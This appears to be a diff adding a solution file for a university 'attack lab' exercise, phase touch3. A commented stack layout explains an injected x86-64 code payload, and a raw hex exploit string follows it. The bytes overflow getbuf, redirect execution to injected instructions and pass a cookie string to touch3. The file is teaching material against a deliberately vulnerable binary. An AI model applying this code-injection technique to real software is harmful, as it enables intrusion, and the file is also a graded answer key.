@@ -1,0 +1,16 @@
+/*
+  Address
+  0x5561dca8    35 39 62 39 39 37 66 61 00           storing the representation of the cookie in the stack frame of test function. It is done that way because touch3 overwrites the injected string
+  0x5561dca0    80 dc 61 55 00 00 00 00              return address from getbuf into the start of the injected code (0x5561dc80)
+  0x5561dc95    00 00 00 00 00 00 00 00 00 00 00     some zeros                    could be any other byte encoding
+  0x5561dc94    c3                                   ret
+  0x5561dc90    48 83 ec 08                          sub  $0x8,%rsp                decrementing the stack pointer (the stack pointer was incremented because of getbuf's ret instruction)
+  0x5561dc85    c7 04 25 a0 dc 61 55 fa 18 40 00     movl $0x4018fa, 0x5561dca0    overwriting the return address another time in order to reach touch3
+  0x5561dc80    bf a8 dc 61 55                       movl $0x5561dca8, %edi        setting the address of the cookie representation as a parameter to touch3
+  0x5561dc78    00 00 00 00 00 00 00 00              some zeros                    could be any other byte encoding
+*/
+
+00 00 00 00 00 00 00 00 bf a8 dc 61 55 c7 04 25 a0 dc 61 55 fa 18 40 00 48 83 ec 08 c3 00 00 00 00 00 00 00 00 00 00 00 80 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
+
+
+
